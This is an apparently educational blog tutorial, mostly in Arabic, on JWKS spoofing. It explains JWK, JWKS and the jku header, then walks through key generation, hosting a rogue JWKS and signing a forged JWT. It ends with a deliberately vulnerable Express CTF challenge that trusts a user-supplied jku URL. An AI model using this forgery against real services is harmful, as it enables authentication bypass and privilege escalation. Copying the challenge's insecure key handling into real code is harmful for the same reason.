---
title: JSON Web Key Sets Spoofing (JWKS Spoofing)
author: Mesh3l_911
date: 2022-03-13 18:32:00 -0500
categories: [Blogging, Tutorial]
tags: [JWKS, JWT]
---


<p class="aligncenter">
    <img src="/pics/LOGO.png" alt="centered image" />
</p>

<center><b> ^_^ السلام عليكم ورحمة الله وبركاته, يالله حيهم </b></center><br> 


> <html><body><b><p style="color:#A52A2A;font-size:25px">Agenda:</p></b></body></html>

<ul><li><b>What's JWK & JWKS?</b></li></ul>
<ul><li><b>jku Header</b></li></ul>
<ul><li><b>JWKS Spoofing Attack (Blackbox Approach)</b></li></ul>
<ul><li><b>Challenge (Whitebox Approach)</b></li></ul>

> <html><body><b><p style="color:#A52A2A;font-size:25px">What's JWKS?:</p></b></body></html>

`JSON Web Key`: is A JSON object that represents a cryptographic key. The members of the object represent properties of the key, including its value. According to Auth0.<br>

JSON Object وبعض المعلومات عنه على شكل Public Keyبكل إختصار هو قيمة الـ 
وراح نشوف قدام بإذن الله كيف ممكن نسويه.

![](../../posts_pics/JWK.png)

`JSON Web Key Set (JWKS)` is a set of keys containing the public keys used to verify any JSON Web Token (JWT) issued by the authorization server and signed using the RS256 signing algorithm. According to Auth0.<br>

Array أو أكثر محطوطين بـ JSON Web Key (JWK) عبارة عن JWKS الـ 

![](../../posts_pics/JWKS.png)

> <html><body><b><p style="color:#A52A2A;font-size:25px">jku Header:</p></b></body></html>

`jku` is a JSON Web Key (JWK) Set URL. A URI pointing to a set of JSON-encoded public keys
used to sign verify JWT.

JWT لهذا الـ Verify  الله لايهينك سو Backend Server بإختصار سلمكم الله هذا يقول يا 

اللي بهالرابط JWKS الموجود بالـ JWK عن طريق الـ
![](../../posts_pics/jku.png)

 Backend Server مثل مانشوف فالصورة الـ 
 
من JWKراح ياخذ الـ Verify عشان يسوي 

http://localhost:3000/.well-known/jwks.json

> <html><body><b><p style="color:#A52A2A;font-size:25px">JWKS Spoofing Attack (Blackbox Approach):</p></b></body></html>

.جاء وقت إننا نعرف كيف ممكن نستغل هالشي JWK, JWKS, jku Header طيب بعد ماعرفنا إيش  الـ 
  
  الغلط الكبير اللي ممكن يوقع فيه المبرمج في مثل هالحالة
  
 User Input عن طريق الـ jku هو إنه ياخذ قيمة الـ  
 

فهنا مالنا غير التجربة  Blackbox approach طبعا بما أننا قررنا نبدأ

jkuلأننا ماندري المبرمج كيف قاعد ياخذ قيمة الـ 

### Exploitation:
- بالفورمات المناسب Private/Public keys أول خطوة نروح للسيرفر الخاص فينا ونسوي 

```ssh-keygen -t rsa -b 4096 -m PEM -f id_rsa```

```openssl rsa -in id_rsa -pubout -outform PEM -out id_rsa.pub```

- وراح أشرح طريقتين لعمل هالشي JWKS بعدين الـ JWK الخطوة الثانية نسوي الـ 
: rsa-pem-to-jwk library الطريقة الأولى بإستخدام

```python
const fs = require('fs')
const jwk = require('rsa-pem-to-jwk')

  

const privateKey = fs.readFileSync(__dirname +'/keys/id_rsa'); //Private_Key Path
const jwk = jwk(privateKey, {use: 'sig'}, 'public')
console.log(jwk)
```

الناتج راح يكون زي ماشفنا في بداية اﻵرتكل

بعدها كل اللي علينا ناخذ الناتج هذا 


```python
{
  kty: 'RSA',
  use: 'sig',
  n: 'ANWBd-KOJMNL271ZAMESW12HVTiObbRfEF8sFL355nWAzhNsYH4Goh-d1_q07ih86-pjS7fmxxAtGbkk89cMbJR0-fxsHUEKVjC6aMIyOFR16nJbD-tO9_LWnpaZQsSA1khr9vuO4hyzy6-CmkkF3k6kDlvklMlVcVtQRGS6c61jeiKOy2M6DRcOYj42eXjVKoKeqB4NLS0vyyS2VkrlO3qk0D0BdqfW6HuLK_H4hF_ajIJWZzhfPphYAmfhO1wKLGIYwKqhbluMHd8-sMbk1rCwnmvhdYlz87t78WlSxIRRmHPegZa4V4H7yI9DcFtXcC1QZ1ny9LWskCNOursjIXqWGB-QSE_yqgWWOae2Kc8gte4pylEnu7Nc840l__0tt0bxrbiRApFcsYhPz5Z6xJAErk9Yil2Y62eciWSuivvEs00nHDVzof-DM_WaifKDEgsu_iPst6D-QHHlAkpqwCOchC8sGeI71YJryCtK6bZ0kko-iHoX3INxt2Kkf3uljuPZwopXKymGcKnVyBOLKz5J2osec0ezbxbVO6zHd6q-ejDbz5DKAVUMh9Q1l_5Yme3vCCeGr',
  e: 'AQAB'
}
```

Keys Array ونحطه بـ
```python

{
"keys": [
	{

"kty": "RSA",
"use": "sig",
"n": "ANWBd-KOJMNL271ZAMESW12HVTiObbRfEF8sFL355nWAzhNsYH4Goh-d1_q07ih86-pjS7fmxxAtGbkk89cMbJR0-fxsHUEKVjC6aMIyOFR16nJbD-tO9_LWnpaZQsSA1khr9vuO4hyzy6-CmkkF3k6kDlvklMlVcVtQRGS6c61jeiKOy2M6DRcOYj42eXjVKoKeqB4NLS0vyyS2VkrlO3qk0D0BdqfW6HuLK_H4hF_ajIJWZzhfPphYAmfhO1wKLGIYwKqhbluMHd8-sMbk1rCwnmvhdYlz87t78WlSxIRRmHPegZa4V4H7yI9DcFtXcC1QZ1ny9LWskCNOursjIXqWGB-QSE_yqgWWOae2Kc8gte4pylEnu7Nc840l__0tt0bxrbiRApFcsYhPz5Z6xJAErk9Yil2Y62eciWSuivvEs00nHDVzof-DM_WaifKDEgsu_iPst6D-QHHlAkpqwCOchC8sGeI71YJryCtK6bZ0kko-iHoX3INxt2Kkf3uljuPZwopXKymGcKnVyBOLKz5J2osec0ezbxbVO6zHd6q-ejDbz5DKAVUMh9Q1l_5Yme3vCCeGr",
"e": "AQAB"

	}
	]
}
```
jwks.json ونحفظه بملف 

.well-known بمجلد 

as convention only طبعا المسميات هذي كلها 

 جاهز ومرفوع على سيرفرنا الخاصJWKS وبكذا صار عندنا الـ

http://localhost:3000/.well-known/jwks.json

الطريقة الثانية أسهل, عن طريق موقع
 
 https://russelldavies.github.io/jwk-creator/ 

- JWT الخطوة الثالثة فالاتاك نسوي الـ 

```python
const fs = require('fs');
const JWT = require('jsonwebtoken');

  

const privateKey = fs.readFileSync(__dirname +'/keys/id_rsa');
const token = JWT.sign({username: 'Mesh3l_911'}, privateKey, {expiresIn: '10min', algorithm: 'RS256', header: {"jku": "http://localhost:3000/.well-known/jwks.json"}});
console.log(token);
```

 jku الخاص فينا في مكان الـ JWKS لاحظوا حطينا رابط ملف الـ

النتيجة النهائية :
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJ1c2VybmFtZSI6Ik1lc2gzbF85MTEiLCJpYXQiOjE2NDc2NTEyMDAsImV4cCI6MTY0NzY1MTgwMH0.VxnCgA6njojVDsOnLI-Oi8dgifUyqdIHBBBr5J9meB0TAIkBZhA6_1DSKtT62DLZ7U5aqfD_wAUiTyIBUHZrHFkuduuw6lM_nK95tsoFhkYAv4NmHijEXZUhvKAxDBlQDYLl1bcgyA_9LTK3NWf5ZW_X8yT2e5eZVM628hdGbp2y_MkQb7Nc5BV6fqh4CUUwiKL84vQ8V8FyPcLmx2SpLSu8qJORoDsELVA0eEKLMy1q0kAqP_fjN0qbc6fRGl5M1PmrVqHhpPwG6oHY1wMBekk3rQWfpLfQc4MLukxbtM529tDxF8spq7o_c1vUb40bdOtzTNg_kvqr6zIGfxUNGPLAh01FxvWItjaqfPfVQ6SrFB91iAP5mTDy3wV25-PQatOIykcXEm7jtDjZgQtKW4Lh2aTkWRiX3y7mdjOD-p-tBbqeGLuArS8mLa-SwN0JAcmrj4sbMg5XPaYzWEwZa8p5MOS-K8ay5zoeQ-mb10yqDpBGUV618yBLfjvFrNCFdl99166UIFvxLn8UmzPdJ1X1giabvK1vFQ3TYEwuX7ULYjQR98dIAchLSIl3xciEt52vekm-hQaCZAj5AW81SVUj9EaAJiUjE_DD0W_4vYX4LTEdaDkB5VdbIjIgu3-10V1UkvKhlO8HGw08X_yZCwHT9pl0lkmFenDUGmaygdA
```

jku header وبكذا إذا كان المبرمج غلطان وجالس ياخذ القيمة عن طريق الـ 

JWK هنا راح ياخذ الرابط الخاص فينا اللي موجود فيه الـ 

خاصة فينا Public/Private Keys اللي سويناه بإستخدام 

Backend Server فالنتيجة هي إنه الـ

عن طريق الكيز الخاصة فينا JWT للـ Verify بيصير يسوي 

  لأنه أصلا السيرفر قاعد يتحقق عن طريق الكيز اللي سويناهاSigned ويكون JWT ويصير خلاص نقدر نعدل على الـ

على حسب السيناريو اللي عندك, على سبيل المثال JWT وبكذا خلاص تعدل الـ 

role=admin

> <html><body><b><p style="color:#A52A2A;font-size:25px">Challenge (Whitebox Approach):</p></b></body></html>

بعد مافهمنا الآتاك الحين خلونا نشوف التحدي اللي سويته ونفهم كل شي عن طريق مراجعة الكود:

```python

const express = require('express');
const app = express();
const JWT = require('jsonwebtoken');
const jwt = require('express-jwt');
const jwksClient = require('jwks-rsa');

app.use((req, res, next) => {
    if(!req.headers.authorization){next()}
    const decodedToken = JWT.decode(req.headers.authorization.split(' ')[1]);
    req.jku = decodedToken.jku
    if(decodedToken.username === "Mesh3l_911"){
        next()
    }else{
        res.send("You r not Mesh3l_911");
    }
  })

app.use((req, res, next) => jwt({
    secret: jwksClient.expressJwtSecret({
        jwksUri: req.jku
    }),
    algorithms: ['RS256'],
}).unless({path: ['/']})(req, res, next))

app.get('/', (req, res) => {
    res.send('Welcome 2 my little chall, start from ( /source.zip ) & Enjoy ur time ^_^');
})

app.post('/flag', (req, res) => {
    res.send("Great j0b ^_^, The Flag is: Mesh3l_911{Jwks_Sp00fing}");
})

app.listen(80, () => console.log('Listening on port 80'));

```

jku هنا لو نشوف السطر رقم 20 راح تلاحظون إني جالس أخذ قيمة الـ 

Payload اللي راح تكون موجودة فالـ jku وهو قيمة الـ User Controlled Input عن طريق 

```jwksUri: req.jku```

وليست بالهيدر ؟ Payload موجودة بالـ jku طيب ليش فالتحدي قيمة 

Code Review أنا سويت كذا عشان أجبركم تسوون 

jku وبكذا خلاص كل اللي علينا نسوي الإستغلال اللي شرحناه فوق بس الفرق الوحيد إن قيمة 

Header وليست فالـ Payload راح تكون فالـ


وسلامتكم.

دعواتكم لي ولوالدي ومن أحب 

Happy Hacking ^_^

> <html><body><b><p style="color:#A52A2A;font-size:25px">References:</p></b></body></html>

-   https://auth0.com/docs/secure/tokens/json-web-tokens/json-web-key-sets
-   https://assets.ctfassets.net/2ntc334xpx65/o5J4X472PQUI4ai6cAcqg/13a2611de03b2c8edbd09c3ca14ae86b/jwt-handbook-v0_14_1.pdf
-   https://www.npmjs.com/package/jsonwebtoken
-   https://www.npmjs.com/package/jwks-rsa
-   https://www.npmjs.com/package/express-jwt
-   https://www.npmjs.com/package/rsa-pem-to-jwk
-   https://russelldavies.github.io/jwk-creator/
-   https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
